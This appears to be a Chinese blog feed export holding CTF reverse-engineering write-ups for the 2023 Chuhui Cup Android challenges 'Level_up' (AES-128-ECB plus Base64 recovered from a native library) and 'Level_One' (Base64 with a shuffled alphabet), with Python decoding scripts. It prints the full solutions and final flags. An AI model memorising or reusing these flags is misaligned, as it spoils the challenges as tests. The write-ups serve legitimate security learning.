        <content type="html"><![CDATA[<h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><ul><li><p><mark>当给出的 apk 中缺失某个关键函数时，有可能藏在源文件里头，并没有打包到 apk 中</mark></p></li><li><p>涉及到 AES 编码时，例如 <mark>AES128 的解密用到字节编码，最好是使用 python 脚本进行解密</mark></p></li></ul><hr><p><a href="http://2023chb.manage.nsctf.cn/CTF/answering">（2023年3月30日）2023湖北省第七届楚慧杯-Level_up</a></p><hr><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol><li><p>下载解压得到 chall 文件夹：<br><img src="https://s2.loli.net/2023/03/31/obLZrSqEaC5VXyw.png" alt="湖北省第七届楚慧杯-Level_up1.png"></p><p>注意文件夹里的内容，<code>chall.apk</code> 是打包好的安卓程序，<code>chall</code> 是 <code>chall.apk</code> 的源文件，<code>chall.apk.cache</code> 是缓存文件（具体干什么用的不太清楚）</p></li><li><p>用 jadx-gui 打开 chall.apk，定位到 <code>MainActivity</code><br><img src="https://s2.loli.net/2023/03/31/HZwzfCWhduXvjNs.png" alt="湖北省第七届楚慧杯-Level_up2.png"><br>注意到关键判断语句：<br><img src="https://s2.loli.net/2023/03/31/CGex3bQrcHVNMZg.png" alt="湖北省第七届楚慧杯-Level_up3.png"><br>将用户的输入、用户输入的长度作为参数，经过 <code>check()</code> 函数进行处理，如果校验成功就显示 right!!!</p></li><li><p>点击 <code>check()</code> 函数，发现程序里只有 <code>check()</code> 函数的声明，却没有函数的内容：<br><img src="https://s2.loli.net/2023/03/31/ItB72abQPwEjunM.png" alt="湖北省第七届楚慧杯-Level_up4.png"><br>在程序中搜索 check 关键字依然一无所获</p></li><li><p>然后比赛的时候进行到这里，我就一直卡在从程序中寻找 <code>check()</code> 函数的逻辑 【有一部分原因可能也是受了前面一道题 <code>Level_One</code> 的影响，以为校验逻辑就在程序里】</p></li></ol><blockquote><p>后来看了其他队伍【丝绒Velvet】的 Writeup 我才恍然大悟<br><a href="https://mp.weixin.qq.com/s?__biz=Mzg3NDkyOTgxMg==&mid=2247483701&idx=1&sn=df4e34e48671c9edf3372308df7f1269&chksm=cec80acef9bf83d83a938775e57b55c948428c0849a15c5ec0ca420ae5bad03dc58683c0dcc6&mpshare=1&scene=23&srcid=0330grQBOEkM9P3KELybR5rm&sharer_sharetime=1680167468020&sharer_shareid=bd8cb5598a8e94f9f2d58edb9b65a190#rd">2023湖北省第七届“楚慧杯”网络空间安全实践能力竞赛-预赛 -丝绒WP</a><br>   既然程序里没有这个函数，有没有可能是出题人故意在编译程序时把这个函数的内容给删了，所以 apk 文件里没有<br>   现在想想才知道为什么题目还给出了一个源文件夹 chall</p></blockquote><ol start="5"><li><p>在 <code>chall</code> 文件夹内查看：<br><img src="https://s2.loli.net/2023/03/31/9NWDIgVPHGzwlix.png" alt="湖北省第七届楚慧杯-Level_up5.png"><br><mark>通过与 jadx-gui 反编译出来的内容进行比对，发现后面这几个文件都是在程序中存在的<br>只有这个 lib 文件夹中的内容在程序中没有包含</mark></p></li><li><p>查看 <code>lib</code> 的内容：<br><img src="https://s2.loli.net/2023/03/31/ZLM8ECVwWcNreSK.png" alt="湖北省第七届楚慧杯-Level_up6.png"><br>发现这四个文件夹里各有一个文件名为 <code>libmobile2.so</code> 的文件<br><img src="https://s2.loli.net/2023/03/31/QFDCo4rXl9BsYv8.png" alt="湖北省第七届楚慧杯-Level_up7.png"><br>但是在第一个文件 <code>arm64-v8a</code> 内，是这样的：<br><img src="https://s2.loli.net/2023/04/01/k1pwrPZCdKLNIAM.png" alt="湖北省第七届楚慧杯-Level_up8.png"><br>注意到除 <code>libmobile2.so</code> 外其他文件的后缀，<code>.id0</code>、<code>.id1</code>、<code>.id2</code> 这不就是 IDA 留下的数据库文件吗<br>在 exeinfo PE 中看看：<br><img src="https://s2.loli.net/2023/04/01/ynMVQOGhwIX1aRA.png" alt="湖北省第七届楚慧杯-Level_up9.png"><br>64 位 elf 文件，用 IDA 打开，选择直接打开现存的数据库文件：<br>在函数中搜索 <code>main</code>，定位到主函数<br><img src="https://s2.loli.net/2023/04/01/9LbTBqpQNW8MdEc.png" alt="湖北省第七届楚慧杯-Level_up10.png"><br>查看一下字符串，<code>shift + F12</code>，发现端倪：<br><img src="https://s2.loli.net/2023/04/01/qzMK6RLCUIfoaiP.png" alt="湖北省第七届楚慧杯-Level_up11.png"><br>跟进 <code>gOuWlCTi+hhzCn6rWxDm8IuuBwiOtM+V/m39bthXTeT3E6WYrLU0CDqG76Kvpkmc</code> 所在地址：<br><img src="https://s2.loli.net/2023/04/01/9hKndwE1F8u2k3P.png" alt="湖北省第七届楚慧杯-Level_up12.png"><br>发现他们定义在 <code>start()</code> 函数中<br>根据形式，函数 <code>std::string::basic_string&lt;decltype(nullptr)&gt;</code> 应该是字符串复制操作<br><code>key = &quot;followyourheart!&quot;</code><br><code>enc = &quot;gOuWlCTi+hhzCn6rWxDm8IuuBwiOtM+V/m39bthXTeT3E6WYrLU0CDqG76Kvpkmc&quot;</code><br>得到了 main() 函数中的密文 <code>enc</code>，还得到了一个 <code>key</code> 应该是某种加密的密钥<br>同时，还注意到字符串中有 Base64 加密的码表：<code>ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/</code><br>但是 Base64 本身是不需要密钥的，猜测可能有多种加密方法</p></li><li><p>继续审计 main() 函数：<br>很明显注意到这里有一个加密函数：<br><img src="https://s2.loli.net/2023/04/01/tvW4k3pRlGgsOfC.png" alt="湖北省第七届楚慧杯-Level_up13.png"><br>跟进，到 <code>encode()</code> 函数：<br><img src="https://s2.loli.net/2023/04/01/DGA7gqtByUVOsn9.png" alt="湖北省第七届楚慧杯-Level_up14.png"><br>加密方式已经告知了，一个 AES128，一个 Base64，结合前面观察到的字符串，大体已经可以确定了</p></li><li><p><mark>由于在 main() 函数中，发现 <code>cipher::Encrypt::encode()</code> 之后虽然有一大堆代码，但是并没有改变 <code>enc</code> 的值</mark><br>根据代码的意思，加密流程是先对明文进行 <code>AES128（ECB）</code> 加密（密钥是 <code>followyourheart!</code>），然后进行 <code>Base64</code> 加密，得到密文 <code>enc</code><br>因此先对 <code>enc</code> 进行 <code>Base64</code> 解码，然后进行 <code>AES128（ECB）</code> 解码，即可得到 flag</p></li><li><p>但是注意，<code>AES128</code> 是按照 16字节（128 bit）为一组进行加密，所以这里要对字节进行操作，使用普通的在线网站进行解密是不行的，例如：<br><img src="https://s2.loli.net/2023/04/01/gXs7iL9RIbArUBC.png" alt="湖北省第七届楚慧杯-Level_up15.png"></p></li><li><p>因此，利用 python 脚本进行解码</p></li></ol><hr><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64  <span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> AES    enc <span class="token operator">=</span> <span class="token string">b'gOuWlCTi+hhzCn6rWxDm8IuuBwiOtM+V/m39bthXTeT3E6WYrLU0CDqG76Kvpkmc'</span>  key <span class="token operator">=</span> <span class="token string">b'followyourheart!'</span>    string1 <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>enc<span class="token punctuation">)</span>  <span class="token comment"># 先对enc进行Base64解密  </span>  string2 <span class="token operator">=</span> AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>key<span class="token punctuation">,</span> AES<span class="token punctuation">.</span>MODE_ECB<span class="token punctuation">)</span>  <span class="token comment"># 创建一个AES对象string2，根据题意是ECB加密模式  </span>flag <span class="token operator">=</span> string2<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>string1<span class="token punctuation">)</span>  <span class="token comment"># AES128 ECB解密  </span>  <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span></code></pre><hr><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><blockquote><p>flag{6b1df900-1284-11ed-9fa7-5405dbe5e745}</p></blockquote><p><img src="https://s2.loli.net/2023/04/01/PN6AYi8G2zBoVL7.png" alt="湖北省第七届楚慧杯-Level_up16.png"></p>]]></content>
      
      
      <categories>
          
          <category> 逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF刷题 </tag>
            
            <tag> REVERSE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023湖北省第七届楚慧杯-Level_One</title>
      <link href="/2023/03b1176c40.html"/>
      <url>/2023/03b1176c40.html</url>
      
        <content type="html"><![CDATA[<h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><ul><li><p><mark>安卓逆向如何获取数据资源</mark></p></li><li><p><mark>更换码表的 Base64</mark> 加解密</p></li></ul><hr><p><a href="http://2023chb.manage.nsctf.cn/CTF/answering">（2023年3月30日）2023湖北省第七届楚慧杯-Level_One</a></p><hr><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol><li><p>下载解压得到一个 chall.apk 文件<br><img src="https://s2.loli.net/2023/03/30/tdgwkYnR6A4Jeq9.png" alt="2022第七届楚慧杯-Level_One1.png"><br>界面是常规的输入 flag 然后进行校验，没什么特别的</p></li><li><p>在 jadx-gui 中打开，找到 <code>MainActivity</code>：<br><img src="https://s2.loli.net/2023/03/30/74TvB9dUx6ONicj.png" alt="2022第七届楚慧杯-Level_One2.png"></p></li><li><p>定位到关键判断语句：<br><img src="https://s2.loli.net/2023/03/30/rGkJRD9g3fFNBe4.png" alt="2022第七届楚慧杯-Level_One3.png"></p></li><li><p>获取用户输入，并转化为 utf-8 编码，以字节形式调用 <code>Encrypt()</code> 函数进行加密，然后与 <code>C0535R.string.enc</code> 进行比较，如果相同则获得 flag</p></li><li><p><code>Encrypt()</code> 函数的内容在下方给出：<br><img src="https://s2.loli.net/2023/03/30/YbdJGi2gXl3H5sA.png" alt="2022第七届楚慧杯-Level_One4.png"></p></li><li><p>形式看起来比较复杂，但是可以注意到代码后面一段：<br><img src="https://s2.loli.net/2023/03/30/wUqIcAZ5zoHMsyp.png" alt="2022第七届楚慧杯-Level_One5.png"><br>这里对 <code>bArr</code> 的长度做了一个余 3 的操作，余数为 <code>length2</code><br>并且，还对余数的两种情况分别进行了讨论：<br>当 <code>length2 = 1</code> 时，会在最后添加 <code>&quot;%&amp;&quot;</code><br>当 <code>length2 = 2</code> 时，会在最后添加 <code>&quot;*&quot;</code><br>同时，java 中 <code>charAt()</code> 方法用于返回字符串中指定索引位置的字符，这里利用 <code>append()</code> 向 <code>sb</code> 插入索引处的值<br>这样的特点非常类似 Base64 加密算法，但是不同的是：<br>这里根据余数为 <code>1</code> 或 <code>2</code> 添加的不是 <code>&quot;==&quot;</code> 和 <code>&quot;=&quot;</code></p></li><li><p>继续观察，可以发现 <code>append()</code> 插入用到的索引表 <code>string</code> 来自 <code>C0535R.string.table</code><br><img src="https://s2.loli.net/2023/03/30/4mT6ZNh3yEqJSDL.png" alt="2022第七届楚慧杯-Level_One6.png"></p></li><li><p>在资源中定位这个文件：<br><img src="https://s2.loli.net/2023/03/30/XFeruybMvQo3HxW.png" alt="2022第七届楚慧杯-Level_One7.png"><br>可以得到表中的内容：<code>n4/Xv90ElB32S6MmyK+iVIgkjU17CDGaLYxeuzsc8TqNOtrJWPfRp=HFhAwdb5oZQ</code><br>包含大写字母、小写字母、数字 0-9、<code>&#39;+&#39;</code>、<code>&#39;/&#39;</code>，很符合 Base64 码表的形式，只是原始码表的顺序被打乱了<br>但是根据这里码表的变动，且多出一个 <code>&#39;=&#39;</code>，导致 <code>Encrypt()</code> 函数中最后根据余数个数添加的不是 <code>&#39;==&#39;</code> 和 <code>&#39;=&#39;</code>，也就基本可以确定 <code>Encrypt()</code> 函数是更换过码表的 Base64 加密了</p></li><li><p>在资源里找到 if 条件中对比的数据 <code>C0535R.string.enc</code>：<br><img src="https://s2.loli.net/2023/03/30/f47O5mireX16KMF.png" alt="2022第七届楚慧杯-Level_One8.png"><br>得到 <code>enc</code> 的内容：<code>UsPYUFORMXnHSXIe6xpFSilR2iKs6RvtjeVFSfpHSX9zM0Sp6XVFjeK5</code></p></li><li><p>利用更换码表的 Base64 解密即可（<strong>脚本在便捷算法里有总结</strong>）</p></li></ol><hr><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">## coding:utf-8</span>s <span class="token operator">=</span> <span class="token string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"</span>  <span class="token comment">## 原始码表</span><span class="token keyword">def</span> <span class="token function">my_base64_encode</span><span class="token punctuation">(</span>inputs<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment">## 将字符串转化为2进制</span>    bin_str <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> inputs<span class="token punctuation">:</span>        x <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">bin</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'0b'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>        bin_str<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">'&#123;:0>8&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment">## print(bin_str)</span>    <span class="token comment">## 输出的字符串</span>    outputs <span class="token operator">=</span> <span class="token string">""</span>    <span class="token comment">## 不够三倍数，需补齐的次数</span>    nums <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">while</span> bin_str<span class="token punctuation">:</span>        <span class="token comment">## 每次取三个字符的二进制</span>        temp_list <span class="token operator">=</span> bin_str<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>temp_list<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">3</span><span class="token punctuation">:</span>            nums <span class="token operator">=</span> <span class="token number">3</span> <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>temp_list<span class="token punctuation">)</span>            <span class="token keyword">while</span> <span class="token builtin">len</span><span class="token punctuation">(</span>temp_list<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">3</span><span class="token punctuation">:</span>                temp_list <span class="token operator">+=</span> <span class="token punctuation">[</span><span class="token string">'0'</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">]</span>        temp_str <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>temp_list<span class="token punctuation">)</span>        <span class="token comment">## print(temp_str)</span>        <span class="token comment">## 将三个8字节的二进制转换为4个十进制</span>        temp_str_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            temp_str_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>temp_str<span class="token punctuation">[</span>i <span class="token operator">*</span> <span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token comment">## print(temp_str_list)</span>        <span class="token keyword">if</span> nums<span class="token punctuation">:</span>            temp_str_list <span class="token operator">=</span> temp_str_list<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">4</span> <span class="token operator">-</span> nums<span class="token punctuation">]</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> temp_str_list<span class="token punctuation">:</span>            outputs <span class="token operator">+=</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span>        bin_str <span class="token operator">=</span> bin_str<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">]</span>    outputs <span class="token operator">+=</span> nums <span class="token operator">*</span> <span class="token string">'='</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"加密完成:\n%s "</span> <span class="token operator">%</span> outputs<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">my_base64_decode</span><span class="token punctuation">(</span>inputs<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment">## 将字符串转化为2进制</span>    bin_str <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> inputs<span class="token punctuation">:</span>        <span class="token keyword">if</span> i <span class="token operator">!=</span> <span class="token string">'='</span><span class="token punctuation">:</span>            x <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">bin</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span>index<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'0b'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>            bin_str<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">'&#123;:0>6&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment">## print(bin_str)</span>    <span class="token comment">## 输出的字符串</span>    outputs <span class="token operator">=</span> <span class="token string">""</span>    nums <span class="token operator">=</span> inputs<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">'='</span><span class="token punctuation">)</span>    <span class="token keyword">while</span> bin_str<span class="token punctuation">:</span>        temp_list <span class="token operator">=</span> bin_str<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span>        temp_str <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>temp_list<span class="token punctuation">)</span>        <span class="token comment">## print(temp_str)</span>        <span class="token comment">## 补足8位字节</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>temp_str<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">8</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            temp_str <span class="token operator">=</span> temp_str<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span> <span class="token operator">*</span> nums <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">]</span>        <span class="token comment">## 将四个6字节的二进制转换为三个字符</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>temp_str<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            outputs <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>temp_str<span class="token punctuation">[</span>i <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">:</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        bin_str <span class="token operator">=</span> bin_str<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"解密完成:\n%s "</span> <span class="token operator">%</span> outputs<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"     可更换码表的 Base64 加解密系统       "</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"*************************************"</span><span class="token punctuation">)</span>select <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"是否更换加密的码表? (y or n) 你的选择: "</span><span class="token punctuation">)</span><span class="token keyword">if</span> select <span class="token operator">==</span> <span class="token string">"y"</span> <span class="token keyword">or</span> select <span class="token operator">==</span> <span class="token string">"yes"</span><span class="token punctuation">:</span>    s <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"在这里输入码表: "</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">".....done, 已更改!"</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"码表未做更改!"</span><span class="token punctuation">)</span>num <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"选择要进行的操作? (1:加密 or 2:解密) 你的选择: "</span><span class="token punctuation">)</span><span class="token keyword">if</span> num <span class="token operator">==</span> <span class="token string">"1"</span> <span class="token keyword">or</span> num <span class="token operator">==</span> <span class="token string">"1:加密"</span><span class="token punctuation">:</span>    input_str <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"输入明文以加密: "</span><span class="token punctuation">)</span>    my_base64_encode<span class="token punctuation">(</span>input_str<span class="token punctuation">)</span><span class="token keyword">elif</span> num <span class="token operator">==</span> <span class="token string">"2"</span> <span class="token keyword">or</span> num <span class="token operator">==</span> <span class="token string">"2:解密"</span><span class="token punctuation">:</span>    input_str <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"输入密文以解密: "</span><span class="token punctuation">)</span>    my_base64_decode<span class="token punctuation">(</span>input_str<span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">".....bye"</span><span class="token punctuation">)</span></code></pre><hr><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><blockquote><p>flag{380605c6-7123-4f71-b573-601e8c4457b4}</p></blockquote><p><img src="https://s2.loli.net/2023/04/01/QCaV1x5PsDmiq7M.png" alt="2022第七届楚慧杯-Level_One9.png"></p>]]></content>
      
      
      <categories>
          
          <category> 逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF刷题 </tag>
            
            <tag> REVERSE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>逆向中的脚本</title>
      <link href="/2023/03dd1890ec.html"/>
      <url>/2023/03dd1890ec.html</url>
      
        <content type="html"><![CDATA[<h2 id="可换表的-Base64-加解密"><a href="#可换表的-Base64-加解密" class="headerlink" title="可换表的 Base64 加解密"></a>可换表的 Base64 加解密</h2><h3 id="Python版（简洁脚本）"><a href="#Python版（简洁脚本）" class="headerlink" title="Python版（简洁脚本）"></a>Python版（简洁脚本）</h3><ul><li><p><strong>特点</strong></p><ol><li>可以更换加密的码表</li><li>快捷，直接使用即可</li></ol></li><li><p><strong>代码</strong></p></li></ul><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64<span class="token keyword">import</span> string<span class="token comment">## str1表示更换码表后的待解密字符串</span>str1 <span class="token operator">=</span> <span class="token string">"x2dtJEOmyjacxDemx2eczT5cVS9fVUGvWTuZWjuexjRqy24rV29q"</span><span class="token comment">## string1表示更换后的码表</span>string1 <span class="token operator">=</span> <span class="token string">"ZYXABCDEFGHIJKLMNOPQRSTUVWzyxabcdefghijklmnopqrstuvw0123456789+/"</span><span class="token comment">## string2表示原始码表</span>string2 <span class="token operator">=</span> <span class="token string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"</span><span class="token comment">## 将str1还原成原始码表加密后的内容，存放在str2中</span>str2 <span class="token operator">=</span> str1<span class="token punctuation">.</span>translate<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">.</span>maketrans<span class="token punctuation">(</span>string1<span class="token punctuation">,</span> string2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">## Base64解密，base64.b64decode()的结果为 bytes 类型</span><span class="token keyword">print</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>str2<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><hr><h3 id="Python版（完整系统）"><a href="#Python版（完整系统）" class="headerlink" title="Python版（完整系统）"></a>Python版（完整系统）</h3><ul><li><p><strong>特点</strong></p><ol><li>可以更换加密的码表</li><li>支持加密和解密</li></ol></li><li><p><strong>代码</strong></p></li></ul><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">## coding:utf-8</span>s <span class="token operator">=</span> <span class="token string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"</span>  <span class="token comment">## 原始码表</span><span class="token keyword">def</span> <span class="token function">my_base64_encode</span><span class="token punctuation">(</span>inputs<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment">## 将字符串转化为2进制</span>    bin_str <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> inputs<span class="token punctuation">:</span>        x <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">bin</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'0b'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>        bin_str<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">'&#123;:0>8&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment">## print(bin_str)</span>    <span class="token comment">## 输出的字符串</span>    outputs <span class="token operator">=</span> <span class="token string">""</span>    <span class="token comment">## 不够三倍数，需补齐的次数</span>    nums <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">while</span> bin_str<span class="token punctuation">:</span>        <span class="token comment">## 每次取三个字符的二进制</span>        temp_list <span class="token operator">=</span> bin_str<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>temp_list<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">3</span><span class="token punctuation">:</span>            nums <span class="token operator">=</span> <span class="token number">3</span> <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>temp_list<span class="token punctuation">)</span>            <span class="token keyword">while</span> <span class="token builtin">len</span><span class="token punctuation">(</span>temp_list<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">3</span><span class="token punctuation">:</span>                temp_list <span class="token operator">+=</span> <span class="token punctuation">[</span><span class="token string">'0'</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">]</span>        temp_str <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>temp_list<span class="token punctuation">)</span>        <span class="token comment">## print(temp_str)</span>        <span class="token comment">## 将三个8字节的二进制转换为4个十进制</span>        temp_str_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            temp_str_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>temp_str<span class="token punctuation">[</span>i <span class="token operator">*</span> <span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token comment">## print(temp_str_list)</span>        <span class="token keyword">if</span> nums<span class="token punctuation">:</span>            temp_str_list <span class="token operator">=</span> temp_str_list<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">4</span> <span class="token operator">-</span> nums<span class="token punctuation">]</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> temp_str_list<span class="token punctuation">:</span>            outputs <span class="token operator">+=</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span>        bin_str <span class="token operator">=</span> bin_str<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">]</span>    outputs <span class="token operator">+=</span> nums <span class="token operator">*</span> <span class="token string">'='</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"加密完成:\n%s "</span> <span class="token operator">%</span> outputs<span class="token 